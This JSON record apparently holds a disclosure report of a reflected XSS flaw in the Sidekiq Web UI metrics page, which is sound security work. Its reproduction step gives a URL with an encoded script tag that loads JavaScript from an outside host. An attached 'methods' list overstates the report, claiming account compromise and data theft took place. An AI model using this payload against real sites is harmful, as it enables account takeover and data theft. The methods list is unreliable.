{"description": "### Description:\nDuring the source Code Review of the metrics.erb view of the Sidekiq Web UI, A reflected XSS vulnerability is discovered. The value of substr parameter is reflected in the response without any encoding, allowing an attacker to inject Javascript code into the response of the application. \n\nThis vulnerability can be exploited to target the users of the application, and users of other applications deployed on the same domain or website as that of the Sidekiq website. Successful exploit results may result in compromise of user accounts and user data.\n\n### Impact:\nThe impact of this vulnerability can be severe. An attacker could exploit it to target users of the Sidekiq Web UI. Moreover, if other applications are deployed on the same domain or website as Sidekiq, users of those applications could also be affected, leading to a broader scope of compromise. Potentially compromising their accounts, forcing the users to perform sensitive actions, stealing sensitive data, performing CORS attacks, defacement of the web application, etc.\n\n### Mitigation:\nEncode all output data before rendering it in the response to prevent XSS attacks.\n\n### Steps to Reproduce:\n1. Go to the following URL of the sidekiq Web UI: \nhttps://{host}/sidekiq/metrics?substr=beret%22%3E%3Cscript%20src=%22https://cheemahq.vercel.app/a.js%22%20/%3E\n2. XSS payload will be executed, causing a popup.\n\n### Evidence:\n\n![image](https://github.com/sidekiq/sidekiq/assets/59286712/9b7efa06-60bc-4d72-bb37-c5949154827e)\nFigure 1: Source Code Vulnerable to XSS\n\n![image](https://github.com/sidekiq/sidekiq/assets/59286712/7a801feb-d495-416e-8e0e-36dee0eadf85)\nFigure 2: XSS payload triggered", "methods": ["Used Reflected Cross-Site Scripting (XSS) to inject JavaScript code into the response of the application.", "Exploited the vulnerability to target users of the application and users of other applications deployed on the same domain or website.", "Used the vulnerability to compromise user accounts and steal sensitive data.", "Used the vulnerability to force users to perform sensitive actions.", "Used the vulnerability to perform CORS attacks.", "Used the vulnerability to deface the web application."]}